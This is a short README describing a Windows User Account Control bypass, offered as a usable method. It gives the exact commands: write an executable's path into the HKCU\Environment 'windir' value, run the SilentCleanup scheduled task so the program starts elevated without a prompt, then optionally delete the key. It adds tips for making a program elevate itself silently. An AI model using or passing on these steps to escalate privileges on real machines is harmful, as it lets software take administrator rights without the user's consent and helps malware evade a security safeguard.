# UAC-Bypass
User Account Control bypass for Windows


## Intro
> I am **not** 100% certain about anything in this topic, so feel free to contribute. <br>
> Also, I don't remember where I found it, because it was maybe a year ago.

This method is old af, but works as intended. <br> 
The only downsides of it are:
- creation another instance of the program (if self elevating)
- detected by the anti viruses
- wide known, old and unreliable

## Logic
Create new key in the registry at `HKCU\Environment`, name it `windir`, and as the value put the path to your exe <br>
This can be done by executing a command `REG ADD HKCU\Environment /v windir /d <PathToExe> /f`. <br>
/f is to overwrite this key if it already exists. <br>

Now run the SilentCleanup task from the scheduled tasks. <br>
This can be done by executing a command `schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I` <br>

*(optional)* <br>
And in the end just remove the key by `REG DELETE HKCU\Environment /v windir /f` <br>

## Self elevation
If you want your program to be "ran as the administrator" without asking the user, and you want to use this method, here are some tips: <br>

- First check if your program is already elevated to prevent unnecesary duplication of it's instance. <br>
- Then if it's not, use the method above and exit.
